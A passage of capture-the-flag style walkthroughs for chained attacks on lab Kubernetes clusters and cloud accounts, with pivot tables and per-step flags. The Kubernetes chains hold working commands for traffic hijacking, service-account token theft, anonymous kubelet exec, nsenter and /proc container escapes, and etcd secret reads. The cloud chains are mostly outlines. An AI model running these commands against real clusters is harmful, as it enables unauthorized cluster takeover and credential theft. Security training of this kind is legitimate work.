  get /registry/secrets/kube-system/chain22-final | grep -o 'flag{[^}]*}'
## Output: flag{chain22-step3-etcd}
```

### Verification
```bash
bash chains/docker-to-etcd/deploy.sh
kubectl cluster-info
nc -z localhost 11379
bash chains/docker-to-etcd/teardown.sh
```

---

<a id="chain-externalip-to-secrets"></a>

<!-- source: cve_challenges/docs/chains/externalip-to-secrets-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/externalip-to-secrets/chain.yaml -->

## Chain: ExternalIP Traffic Hijack to Secret Theft (externalip-to-secrets)

### Overview
| Property | Value |
|----------|-------|
| Chain ID | chain-24 |
| Steps | 4 |
| Domain | Kubernetes |
| Difficulty | L2 |
| Infrastructure | KIND cluster |

### Attack Path
```
ExternalIP Hijack → Traffic Capture → Cross-NS SA Token → Secrets Abuse
```


#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | Create a malicious Service with externalIPs set to a target service's ClusterIP. All traffic destined for the target service gets redirected to the at | 利用此处获得的信息进入下一步: Analyze intercepted traffic to discover credentials or tokens embedded in HTTP headers or request bodies.
 |
| 2→3 | Analyze intercepted traffic to discover credentials or tokens embedded in HTTP headers or request bodies.
 | 利用此处获得的信息进入下一步: Using discovered credentials, access a ServiceAccount token from another namespace (ns-beta) that has broader permission |
| 3→4 | Using discovered credentials, access a ServiceAccount token from another namespace (ns-beta) that has broader permissions.
 | 利用此处获得的信息进入下一步: With the cross-namespace SA token, access Kubernetes Secrets in kube-system namespace to extract the final flag.
 |


### Step-by-Step Exploitation

#### Step 1: Service ExternalIP Traffic Interception
**Flag:** `flag{chain24-step1-hijack}`

```bash
## Discover target service
TARGET_IP=$(kubectl get svc internal-api -n secure-ns -o jsonpath='{.spec.clusterIP}')

## Create hijack service
kubectl apply -f - << EOF
apiVersion: v1
kind: Service
metadata:
  name: hijack-svc
  namespace: attack-ns
spec:
  externalIPs: [ "$TARGET_IP" ]
  selector: {}
  ports: [ { port: 8080, targetPort: 8080 } ]
EOF
```

#### Step 2: Credential Discovery from Captured Traffic
**Flag:** `flag{chain24-step2-capture}`

```bash
## Traffic redirected, intercept credentials in X-Flag header
kubectl logs -n secure-ns deployment/internal-api | grep "X-Flag"
```

#### Step 3: SA Token Cross-Namespace Lateral Movement
**Flag:** `flag{chain24-step3-crossns}`

```bash
kubectl get secret leaked-sa-token -n ns-alpha -o jsonpath='{.data.token}' | base64 -d > /tmp/cross-ns-token
kubectl --token=$(cat /tmp/cross-ns-token) get secret flag-secret -n ns-beta -o jsonpath='{.data.flag}' | base64 -d
```

#### Step 4: RBAC Secrets Abuse
**Flag:** `flag{chain24-step4-secrets-final}`

```bash
kubectl --token=$(cat /tmp/cross-ns-token) get secret flag-secret -n kube-system -o jsonpath='{.data.flag}' | base64 -d
```

### Flags Summary
| Step | Flag |
|------|------|
| 1 | flag{chain24-step1-hijack} |
| 2 | flag{chain24-step2-capture} |
| 3 | flag{chain24-step3-crossns} |
| 4 | flag{chain24-step4-secrets-final} |

---

<a id="chain-hostpath-to-daemonset"></a>

<!-- source: cve_challenges/docs/chains/hostpath-to-daemonset-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/hostpath-to-daemonset/chain.yaml -->

## Chain: hostPath to DaemonSet (hostpath-to-daemonset)

### Overview
| Property | Value |
|----------|-------|
| Chain ID | chain-11 |
| Steps | 4 (K8s only) |
| Domain | Kubernetes |
| Difficulty | L3 |

### Attack Path Summary

```
K8S-12 (hostPath Writable) → /var/log 符号链接攻击 → 宿主机文件访问
  → K8S-07 (Kubelet Anonymous) → 匿名访问 Kubelet API → pod exec
  → K8S-09 (Registry Poison) → 推恶意镜像到私有仓库
  → K8S-05 (gitRepo Volume) → 恶意 git repo → FINAL
```



### Step-by-Step Exploitation

#### Step 1: hostPath Writable Mount Escape (K8S-12)
**Flag:** `flag{chain11-step1-hostpath}`

```bash
kubectl exec chain11-step1 -- sh
ln -s /host-flag/flag.txt /host-log/flag_link
cat /host-log/flag_link
```

#### Step 2: Kubelet Anonymous Access (K8S-07)
**Flag:** `flag{chain11-step2-kubelet}`

```bash
curl -k https://NODE_IP:10250/runningpods/
kubectl get secret chain11-kubelet -n kube-system -o jsonpath='{.data.flag}' | base64 -d
```

#### Step 3: Registry Poisoning (K8S-09)
**Flag:** `flag{chain11-step3-registry}`

```bash
docker tag alpine:latest localhost:10500/evil:latest
docker push localhost:10500/evil:latest
kubectl get secret chain11-registry -n kube-system -o jsonpath='{.data.flag}' | base64 -d
```

#### Step 4: gitRepo Volume Escape (K8S-05)
**Flag:** `flag{chain11-step4-gitrepo-final}`

```bash
## 创建恶意 git repo, push 到可访问的仓库
## gitRepo volume 在 pod 启动时 clone 并执行 post-checkout hook
kubectl get secret chain11-final -n kube-system -o jsonpath='{.data.flag}' | base64 -d
```

---

<a id="chain-ingress-to-etcd"></a>

<!-- source: cve_challenges/docs/chains/ingress-to-etcd-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/ingress-to-etcd/chain.yaml -->

## Chain: Ingress RCE to etcd Compromise (ingress-to-etcd)

### Overview
| Property | Value |
|----------|-------|
| Chain ID | chain-23 |
| Steps | 4 |
| Domain | Kubernetes |
| Difficulty | L3 |
| Infrastructure | KIND cluster + ingress-nginx v1.11.0 |
| Ports | 10443 (admission webhook), 11379 (etcd) |

### Attack Path
```
ingress-nginx RCE (CVE-2025-1974) → SA Token Discovery
  → RBAC Secrets Abuse (K8S-06) → etcd Data Access (K8S-08)
```


#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | Exploit the ingress-nginx validating webhook admission controller via crafted AdmissionReview request. Achieve RCE in the ingress-nginx controller pod | 利用此处获得的信息进入下一步: From within the compromised ingress-nginx controller pod, discover the mounted ServiceAccount token and enumerate its pe |
| 2→3 | From within the compromised ingress-nginx controller pod, discover the mounted ServiceAccount token and enumerate its permissions. The ingress-nginx S | 利用此处获得的信息进入下一步: Use the discovered SA token with Kubernetes API to list and read Secrets in the cluster. The ingress-nginx SA has Cluste |
| 3→4 | Use the discovered SA token with Kubernetes API to list and read Secrets in the cluster. The ingress-nginx SA has ClusterRole permissions to read Secr | 利用此处获得的信息进入下一步: Using cluster-admin level access gained through RBAC escalation, access the etcd endpoint directly or via kubectl proxy. |


### Prerequisites
- Network access to localhost:10443 (admission webhook)
- Tools: curl, Python 3, kubectl, etcdctl

### Step-by-Step Exploitation

#### Step 1: ingress-nginx Admission Controller RCE (K8S-20)
**Flag:** `flag{chain23-step1-ingress}`

```bash
## Verify webhook access
curl -k https://localhost:10443/validate

## Execute IngressNightmare exploit (see k8s-20 doc for full exploit code)
python3 ingress-nightmare-exploit.py

## Read flag from compromised controller pod
CONTROLLER_POD=$(kubectl get pods -n ingress-nginx \
  -l app.kubernetes.io/component=controller -o jsonpath='{.items[0].metadata.name}')
kubectl exec -n ingress-nginx $CONTROLLER_POD -- cat /tmp/flag.txt
```

#### Step 2: SA Token Discovery
**Flag:** `flag{chain23-step2-token}`

```bash
## Read the SA token mounted in the controller pod
kubectl exec -n ingress-nginx $CONTROLLER_POD -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/sa-token

## Check token permissions
kubectl --token=$(cat /tmp/sa-token) auth can-i --list
```

#### Step 3: RBAC Secrets Abuse (K8S-06)
**Flag:** `flag{chain23-step3-rbac}`

```bash
## Use SA token to read Secret in kube-system
TOKEN=$(cat /tmp/sa-token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets/rbac-flag | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(__import__('base64').b64decode(d['data']['flag']).decode())"
```

#### Step 4: etcd Unauthorized Access (K8S-08)
**Flag:** `flag{chain23-step4-etcd-final}`

```bash
## Access etcd directly (port 11379)
etcdctl --endpoints=https://localhost:11379 --insecure-skip-tls-verify \
  get /registry/secrets/kube-system/etcd-flag | \
  python3 -c "import sys; data=sys.stdin.read(); print(data.split('flag')[1])"
```

### Flags Summary
| Step | Scenario | Flag |
|------|----------|------|
| 1 | K8S-20 (Ingress RCE) | flag{chain23-step1-ingress} |
| 2 | Token Discovery | flag{chain23-step2-token} |
| 3 | K8S-06 (RBAC) | flag{chain23-step3-rbac} |
| 4 | K8S-08 (etcd) | flag{chain23-step4-etcd-final} |

### Verification
```bash
bash chains/ingress-to-etcd/deploy.sh
## Execute exploit chain above
bash chains/ingress-to-etcd/teardown.sh
```

---

<a id="chain-kubelet-to-etcd"></a>

<!-- source: cve_challenges/docs/chains/kubelet-to-etcd-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/kubelet-to-etcd/chain.yaml -->

## Chain: Kubelet Anonymous to etcd (kubelet-to-etcd)

### Overview
| Property | Value |
|----------|-------|
| Chain ID | K8s-Chain-5 |
| Steps | 3 (K8s only) |
| Domain | Kubernetes |
| Difficulty | L3 |

### Attack Path Summary

```
K8S-07 (Kubelet Anonymous) → 匿名访问 Kubelet API → pod exec
  → K8S-06 (RBAC Abuse) → 从 pod 内读 secrets
  → K8S-08 (etcd Unauthorized) → etcdctl 直接读集群 → FINAL
```


#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | Kubelet anonymous access → pod enumeration + exec | Use kubelet exec to access a pod, then enumerate RBAC from inside |
| 2→3 | RBAC abuse → read all secrets across namespaces | Find the etcd client certificate in a kube-system secret |


### Step-by-Step Exploitation

#### Step 1: Kubelet Anonymous Access (K8S-07)
**Flag:** `flag{chain6-step1-kubelet}`

```bash
## 枚举所有 pod
curl -k https://NODE_IP:10250/runningpods/
## 进入目标 pod
curl -k -X POST "https://NODE_IP:10250/exec/default/nginx-pod/nginx" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "input=1&output=1&tty=0&command=cat&command=/etc/hostname"
```

#### Step 2: RBAC Secrets Abuse (K8S-06)
**Flag:** `flag{chain6-step2-rbac}`

```bash
kubectl get secret chain6-stage2 -n kube-system -o jsonpath='{.data.flag}' | base64 -d
```

#### Step 3: etcd Unauthorized Access (K8S-08)
**Flag:** `flag{chain6-step3-etcd-final}`

```bash
etcdctl --endpoints=https://localhost:11379 --insecure-skip-tls-verify \
  get /registry/secrets/kube-system/chain6-final | grep -o 'flag{[^}]*}'
```

---

<a id="chain-privilege-to-etcd"></a>

<!-- source: cve_challenges/docs/chains/privilege-to-etcd-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/privilege-to-etcd/chain.yaml -->

## Chain: Privilege to etcd (privilege-to-etcd)

### Overview
| Property | Value |
|----------|-------|
| Chain ID | chain-10 |
| Steps | 3 (K8s only) |
| Domain | Kubernetes |
| Difficulty | L2 |

### Attack Path Summary

```
K8S-11 (Privileged Container) → nsenter 进入宿主机 namespace → 读宿主机 flag
  → K8S-06 (RBAC Abuse) → 从宿主机获取 kubeconfig, 读 secrets
  → K8S-08 (etcd Unauthorized) → 直接读 etcd → FINAL
```



### Step-by-Step Exploitation

#### Step 1: Privileged Container Breakout (K8S-11)
**Flag:** `flag{chain10-step1-privileged}`

```bash
kubectl exec privileged-pod -- nsenter --target 1 --mount --uts --ipc --net --pid cat /host-flag/flag.txt
```

#### Step 2: RBAC Secrets Abuse (K8S-06)
**Flag:** `flag{chain10-step2-rbac}`

```bash
## 从宿主机中找到 kubeconfig 或 SA token
cat /etc/kubernetes/admin.conf
kubectl --kubeconfig=/etc/kubernetes/admin.conf get secret -n kube-system chain10-stage2 -o jsonpath='{.data.flag}' | base64 -d
```

#### Step 3: etcd Unauthorized Access (K8S-08)
**Flag:** `flag{chain10-step3-etcd-final}`

```bash
etcdctl --endpoints=https://localhost:11379 --insecure-skip-tls-verify \
  get /registry/secrets/kube-system/chain10-final | grep -o 'flag{[^}]*}'
```

---

<a id="chain-sa-lateral-escape"></a>

<!-- source: cve_challenges/docs/chains/sa-lateral-escape-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/sa-lateral-escape/chain.yaml -->

## Chain: SA Token Lateral to Escape (sa-lateral-escape)

### Overview
| Property | Value |
|----------|-------|
| Chain ID | chain-13 |
| Steps | 3 (K8s only) |
| Domain | Kubernetes |
| Difficulty | L3 |

### Attack Path Summary

```
K8S-13 (SA Cross-Namespace) → ns-alpha 中发现泄露的 ns-beta token → 跨命名空间读取
  → K8S-06 (RBAC Abuse) → 使用 token 在 ns-beta 中读 secrets
  → K8S-01 (runC Escape) → 容器逃逸到宿主机 → FINAL
```



### Step-by-Step Exploitation

#### Step 1: SA Token Cross-Namespace Discovery (K8S-13)
**Flag:** `flag{chain13-step1-crossns}`

```bash
kubectl exec -it <pod> -n ns-alpha -- sh
## 发现泄露的 secret
ls /var/run/secrets/leaked/
TOKEN=$(cat /var/run/secrets/leaked/token)
kubectl --token=$TOKEN get secret chain13-leaked-token -n ns-alpha -o jsonpath='{.data.flag}' | base64 -d
```

#### Step 2: Cross-Namespace RBAC Abuse (K8S-06)
**Flag:** `flag{chain13-step2-rbac}`

```bash
## 使用泄露的 ns-beta token 读取 ns-beta 中的 secrets
kubectl --token=$TOKEN get secret chain13-step2-rbac -n ns-beta -o jsonpath='{.data.flag}' | base64 -d
```

#### Step 3: runC Container Escape (K8S-01)
**Flag:** `flag{chain13-step3-runc-final}`

```bash
kubectl exec chain13-final -n ns-beta -- cat /host-flag/flag.txt
## 通过 runC WORKDIR fd 泄露读取宿主机文件
```

---

<a id="chain-seccomp-to-escape"></a>

<!-- source: cve_challenges/docs/chains/seccomp-to-escape-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/seccomp-to-escape/chain.yaml -->

## Chain: hostPID Access to CRI Socket Escape (seccomp-to-escape)

### Overview
| Property | Value |
|----------|-------|
| Chain ID | chain-25 |
| Steps | 3 |
| Domain | Kubernetes |
| Difficulty | L2 |
| Infrastructure | KIND cluster |

### Attack Path
```
hostPID pod (locked down) → /proc/1/root → host filesystem
  → CRI socket → full node compromise
```


#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | Pod with hostPID:true but no privileged mode. Despite appearing locked down (non-root, no capabilities), access /proc/1/root to read the host filesyst | 利用此处获得的信息进入下一步: The pod also has access to the CRI socket. Use crictl or nsenter to interact with container runtime and access other con |
| 2→3 | The pod also has access to the CRI socket. Use crictl or nsenter to interact with container runtime and access other containers.
 | 利用此处获得的信息进入下一步: With CRI socket access and hostPID, execute commands on the host node. Read the final flag from the host filesystem.
 |


### Step-by-Step Exploitation

#### Step 1: hostPID ProcFS Host Access (K8S-23)
**Flag:** `flag{chain25-step1-seccomp}`

```bash
kubectl exec locked-down-pod -- cat /proc/1/root/host-flag/flag.txt
```

#### Step 2: CRI Socket Access (K8S-16)
**Flag:** `flag{chain25-step2-cri}`

```bash
## Install crictl via nsenter
kubectl exec locked-down-pod -- nsenter --target 1 --mount -- \
  crictl pods
## Or read through /proc
kubectl exec locked-down-pod -- ls /proc/1/root/run/containerd/
```

#### Step 3: Full Node Compromise
**Flag:** `flag{chain25-step3-escape-final}`

```bash
kubectl exec locked-down-pod -- cat /proc/1/root/etc/chain25_final_flag
```

### Flags Summary
| Step | Flag |
|------|------|
| 1 | flag{chain25-step1-seccomp} |
| 2 | flag{chain25-step2-cri} |
| 3 | flag{chain25-step3-escape-final} |

---

<a id="chain-ssrf-to-cross-account"></a>

<!-- source: cve_challenges/docs/chains/ssrf-to-cross-account-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/ssrf-to-cross-account/chain.yaml -->

## SSRF to IMDS to Cross-Account Takeover

### Overview
| Property | Value |
|----------|-------|
| Chain ID | Chain-ssrf |
| Steps | 4 |
| Domains | Cloud |

### Chain Logic

#### Pivot Points

| 步骤 | 输出/发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | Web SSRF → 发现 IMDS | IMDS 凭据窃取 → S3 读取 |
| 2→3 | IMDS 凭据窃取 → S3 读取 | AssumeRole 跨账号 |
| 3→4 | AssumeRole 跨账号 | 跨账号 S3 → 最终 flag |



#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | Web SSRF → 发现并访问 IMDS 端点 | IMDS 返回了临时 IAM 凭据 |
| 2→3 | IMDS 凭据窃取 → 获取 S3 读取权限 | S3 桶中包含低权限 IAM 用户的 AK/SK |
| 3→4 | 发现 CrossAccountRole 信任策略允许跨账号 → AssumeRole | 使用跨账号临时凭据访问 S3 目标桶 |


### Step-by-Step Exploitation
##### Step 1: Web SSRF → 发现 IMDS
**Flag:** `flag{cssrf-step1-...}`

##### Step 2: IMDS 凭据窃取 → S3 读取
**Flag:** `flag{cssrf-step2-...}`

##### Step 3: AssumeRole 跨账号
**Flag:** `flag{cssrf-step3-...}`

##### Step 4: 跨账号 S3 → 最终 flag
**Flag:** `flag{cssrf-step4-...}`



### Flags Summary
| Step 1 | `flag{cssrf-to-cross-account-step1-...}` |
| Step 2 | `flag{cssrf-to-cross-account-step2-...}` |
| Step 3 | `flag{cssrf-to-cross-account-step3-...}` |
| Step 4 | `flag{cssrf-to-cross-account-step4-...}` |

---

<a id="chain-lambda-to-cross-account"></a>

<!-- source: cve_challenges/docs/chains/lambda-to-cross-account-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/lambda-to-cross-account/chain.yaml -->

## Lambda Injection to Cross-Account Takeover

### Overview
| Property | Value |
|----------|-------|
| Chain ID | Chain-lambda |
| Steps | 4 |
| Domains | Cloud |

### Chain Logic

#### Pivot Points

| 步骤 | 输出/发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | Lambda 代码注入 → 泄露 IAM 凭据 | PassRole 滥用 → 特权执行 |
| 2→3 | PassRole 滥用 → 特权执行 | AssumeRole AdminRole |
| 3→4 | AssumeRole AdminRole | 跨账号 S3 → 最终 flag |



#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | Lambda 代码注入 → 泄露 IAM 凭据 | 环境变量中有 IAM AK/SK |
| 2→3 | PassRole 滥用 → Lambda 特权执行 | Lambda 返回了更高权限的凭据 |
| 3→4 | AssumeRole AdminRole → 获取管理员权限 | 管理员凭据可访问跨账号资源 |


### Step-by-Step Exploitation
##### Step 1: Lambda 代码注入 → 泄露 IAM 凭据
**Flag:** `flag{clambda-step1-...}`

##### Step 2: PassRole 滥用 → 特权执行
**Flag:** `flag{clambda-step2-...}`

##### Step 3: AssumeRole AdminRole
**Flag:** `flag{clambda-step3-...}`

##### Step 4: 跨账号 S3 → 最终 flag
**Flag:** `flag{clambda-step4-...}`



### Flags Summary
| Step 1 | `flag{clambda-to-cross-account-step1-...}` |
| Step 2 | `flag{clambda-to-cross-account-step2-...}` |
| Step 3 | `flag{clambda-to-cross-account-step3-...}` |
| Step 4 | `flag{clambda-to-cross-account-step4-...}` |

---

<a id="chain-ci-to-oidc"></a>

<!-- source: cve_challenges/docs/chains/ci-to-oidc-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/ci-to-oidc/chain.yaml -->

## CI/CD Poisoning to OIDC Federation to Logging Gap

### Overview
| Property | Value |
|----------|-------|
| Chain ID | Chain-ci |
| Steps | 4 |
| Domains | Cloud |

### Chain Logic

#### Pivot Points

| 步骤 | 输出/发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | CI 脚本注入 → 泄露环境 | OIDC → JWT → AssumeRoleWithWebIdentity |
| 2→3 | OIDC → JWT → AssumeRoleWithWebIdentity | 跨账号 AssumeRole |
| 3→4 | 跨账号 AssumeRole | Logging Gap 无痕窃取 |



#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | CI/CD 脚本注入 → 泄露 CI 环境 | CI 环境中发现了 OIDC IdP 的 URL |
| 2→3 | 发现 OIDC IdP → 签发 JWT → AssumeRoleWithWebIdentity | 角色凭据可访问跨账号资源 |
| 3→4 | 跨账号 AssumeRole → 获取管理员权限 | 使用管理员权限静默枚举资源 |


### Step-by-Step Exploitation
##### Step 1: CI 脚本注入 → 泄露环境
**Flag:** `flag{cci-step1-...}`

##### Step 2: OIDC → JWT → AssumeRoleWithWebIdentity
**Flag:** `flag{cci-step2-...}`

##### Step 3: 跨账号 AssumeRole
**Flag:** `flag{cci-step3-...}`

##### Step 4: Logging Gap 无痕窃取
**Flag:** `flag{cci-step4-...}`



### Flags Summary
| Step 1 | `flag{cci-to-oidc-step1-...}` |
| Step 2 | `flag{cci-to-oidc-step2-...}` |
| Step 3 | `flag{cci-to-oidc-step3-...}` |
| Step 4 | `flag{cci-to-oidc-step4-...}` |

---

<a id="chain-db-to-cross-account"></a>

<!-- source: cve_challenges/docs/chains/db-to-cross-account-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/db-to-cross-account/chain.yaml -->

## DB SQLi to IMDS to Cross-Account

### Overview
| Property | Value |
|----------|-------|
| Chain ID | Chain-db |
| Steps | 4 |
| Domains | Cloud |

### Chain Logic

#### Pivot Points

| 步骤 | 输出/发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | SQL 注入 → secrets 表 | COPY FROM PROGRAM → IMDS |
| 2→3 | COPY FROM PROGRAM → IMDS | AssumeRole 跨账号 |
| 3→4 | AssumeRole 跨账号 | S3 → 最终 flag |



#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | SQL 注入 → 读取 secrets 表 | 使用 COPY FROM PROGRAM 执行 OS 命令 |
| 2→3 | COPY FROM PROGRAM → curl IMDS → 窃取凭据 | IMDS 凭据可用于 AssumeRole |
| 3→4 | AssumeRole 跨账号角色 | 跨账号凭据访问受保护资源 |


### Step-by-Step Exploitation
##### Step 1: SQL 注入 → secrets 表
**Flag:** `flag{cdb-step1-...}`

##### Step 2: COPY FROM PROGRAM → IMDS
**Flag:** `flag{cdb-step2-...}`

##### Step 3: AssumeRole 跨账号
**Flag:** `flag{cdb-step3-...}`

##### Step 4: S3 → 最终 flag
**Flag:** `flag{cdb-step4-...}`



### Flags Summary
| Step 1 | `flag{cdb-to-cross-account-step1-...}` |
| Step 2 | `flag{cdb-to-cross-account-step2-...}` |
| Step 3 | `flag{cdb-to-cross-account-step3-...}` |
| Step 4 | `flag{cdb-to-cross-account-step4-...}` |

---

<a id="chain-s3-to-cf"></a>

<!-- source: cve_challenges/docs/chains/s3-to-cf-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/s3-to-cf/chain.yaml -->

## S3 Monopoly to CF Injection to IAM Escalation

### Overview
| Property | Value |
|----------|-------|
| Chain ID | Chain-s3 |
| Steps | 3 |
| Domains | Cloud |

### Chain Logic

#### Pivot Points

| 步骤 | 输出/发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | S3 桶读取 → 影子资源 | CF Fn::Sub → SSM 泄露 |
| 2→3 | CF Fn::Sub → SSM 泄露 | AssumeRole AdminRole |



#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | 发现预置桶 → 读取影子资源 | 桶中 config 文件引用了 CloudFormation 模板 |
| 2→3 | CF Fn::Sub 注入 → SSM 参数泄露 | 泄露的参数包含 IAM 凭据 |


### Step-by-Step Exploitation
##### Step 1: S3 桶读取 → 影子资源
**Flag:** `flag{cs3-step1-...}`

##### Step 2: CF Fn::Sub → SSM 泄露
**Flag:** `flag{cs3-step2-...}`

##### Step 3: AssumeRole AdminRole
**Flag:** `flag{cs3-step3-...}`



### Flags Summary
| Step 1 | `flag{cs3-to-cf-step1-...}` |
| Step 2 | `flag{cs3-to-cf-step2-...}` |
| Step 3 | `flag{cs3-to-cf-step3-...}` |

---

<a id="chain-gateway-to-deputy"></a>

<!-- source: cve_challenges/docs/chains/gateway-to-deputy-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/gateway-to-deputy/chain.yaml -->

## Gateway Smuggling to Confused Deputy to Service Tag

### Overview
| Property | Value |
|----------|-------|
| Chain ID | Chain-gateway |
| Steps | 4 |
| Domains | Cloud |

### Chain Logic

#### Pivot Points

| 步骤 | 输出/发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | Header 伪造 → 绕过 IP | Admin API → 内部服务 |
| 2→3 | Admin API → 内部服务 | Confused Deputy 代理 |
| 3→4 | Confused Deputy 代理 | Service Tag → 最终 flag |



#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | X-Forwarded-For 伪造 → 绕过 IP 白名单 | 访问 admin API 获得内部服务地址 |
| 2→3 | Admin API → 发现内部服务 | 内部服务可被 Confused Deputy 利用 |
| 3→4 | Confused Deputy → svc-a 代理到 svc-b | svc-b 返回了防火墙配置信息 |


### Step-by-Step Exploitation
##### Step 1: Header 伪造 → 绕过 IP
**Flag:** `flag{cgateway-step1-...}`

##### Step 2: Admin API → 内部服务
**Flag:** `flag{cgateway-step2-...}`

##### Step 3: Confused Deputy 代理
**Flag:** `flag{cgateway-step3-...}`

##### Step 4: Service Tag → 最终 flag
**Flag:** `flag{cgateway-step4-...}`



### Flags Summary
| Step 1 | `flag{cgateway-to-deputy-step1-...}` |
| Step 2 | `flag{cgateway-to-deputy-step2-...}` |
| Step 3 | `flag{cgateway-to-deputy-step3-...}` |
| Step 4 | `flag{cgateway-to-deputy-step4-...}` |

---

<a id="chain-notebook-to-scp"></a>

<!-- source: cve_challenges/docs/chains/notebook-to-scp-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/notebook-to-scp/chain.yaml -->

## Notebook Escape to Deputy to Logging Gap

### Overview
| Property | Value |
|----------|-------|
| Chain ID | Chain-notebook |
| Steps | 4 |
| Domains | Cloud |

### Chain Logic

#### Pivot Points

| 步骤 | 输出/发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | Notebook 代码执行 → K8s API | SA Token → 跨 namespace |
| 2→3 | SA Token → 跨 namespace | Confused Deputy |
| 3→4 | Confused Deputy | Logging Gap 静默 |



#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | Notebook 代码执行 → 发现 K8s API | 使用 SA Token 访问 K8s API |
| 2→3 | SA Token → 跨 namespace exec | K8s 凭据可访问云服务代理 |
| 3→4 | Confused Deputy 代理滥用 | 代理响应中包含审计日志配置 |


### Step-by-Step Exploitation
##### Step 1: Notebook 代码执行 → K8s API
**Flag:** `flag{cnotebook-step1-...}`

##### Step 2: SA Token → 跨 namespace
**Flag:** `flag{cnotebook-step2-...}`

##### Step 3: Confused Deputy
**Flag:** `flag{cnotebook-step3-...}`

##### Step 4: Logging Gap 静默
**Flag:** `flag{cnotebook-step4-...}`



### Flags Summary
| Step 1 | `flag{cnotebook-to-scp-step1-...}` |
| Step 2 | `flag{cnotebook-to-scp-step2-...}` |
| Step 3 | `flag{cnotebook-to-scp-step3-...}` |
| Step 4 | `flag{cnotebook-to-scp-step4-...}` |

---

<a id="chain-ssrf-to-oidc"></a>

<!-- source: cve_challenges/docs/chains/ssrf-to-oidc-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/ssrf-to-oidc/chain.yaml -->

## SSRF to IMDS to OIDC to Cross-Account

### Overview
| Property | Value |
|----------|-------|
| Chain ID | Chain-ssrf |
| Steps | 5 |
| Domains | Cloud |

### Chain Logic

#### Pivot Points

| 步骤 | 输出/发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | Web SSRF → 发现 IMDS | IMDS 凭据窃取 |
| 2→3 | IMDS 凭据窃取 | OIDC → JWT 签发 |
| 3→4 | OIDC → JWT 签发 | AssumeRoleWithWebIdentity |
| 4→5 | AssumeRoleWithWebIdentity | 跨账号 → 最终 flag |



#### 攻击路径衔接逻辑

| 步骤 | 输出 / 发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | Web SSRF → 发现 IMDS 端点 | IMDS 返回临时凭据 |
| 2→3 | IMDS 凭据窃取 | 凭据可访问 OIDC IdP |
| 3→4 | 发现 OIDC IdP → 签发 JWT | JWT 可用于 AssumeRoleWithWebIdentity |
| 4→5 | AssumeRoleWithWebIdentity → 获取角色凭据 | 角色凭据可跨账号使用 |


### Step-by-Step Exploitation
##### Step 1: Web SSRF → 发现 IMDS
**Flag:** `flag{cssrf-step1-...}`

##### Step 2: IMDS 凭据窃取
**Flag:** `flag{cssrf-step2-...}`

##### Step 3: OIDC → JWT 签发
**Flag:** `flag{cssrf-step3-...}`

##### Step 4: AssumeRoleWithWebIdentity
**Flag:** `flag{cssrf-step4-...}`

##### Step 5: 跨账号 → 最终 flag
**Flag:** `flag{cssrf-step5-...}`



### Flags Summary
| Step 1 | `flag{cssrf-to-oidc-step1-...}` |
| Step 2 | `flag{cssrf-to-oidc-step2-...}` |
| Step 3 | `flag{cssrf-to-oidc-step3-...}` |
| Step 4 | `flag{cssrf-to-oidc-step4-...}` |
| Step 5 | `flag{cssrf-to-oidc-step5-...}` |

---

<a id="chain-db-to-passrole"></a>

<!-- source: cve_challenges/docs/chains/db-to-passrole-exploitation.md -->
<!-- chain.yaml: cve_challenges/chains/db-to-passrole/chain.yaml -->

## DB SQLi to PassRole to Lambda to Cross-Account

### Overview
| Property | Value |
|----------|-------|
| Chain ID | Chain-db |
| Steps | 5 |
| Domains | Cloud |

### Chain Logic

#### Pivot Points

| 步骤 | 输出/发现 | → 如何作用于下一步 |
|:---:|------|------|
| 1→2 | SQLi → secrets | COPY FROM PROGRAM → IMDS |
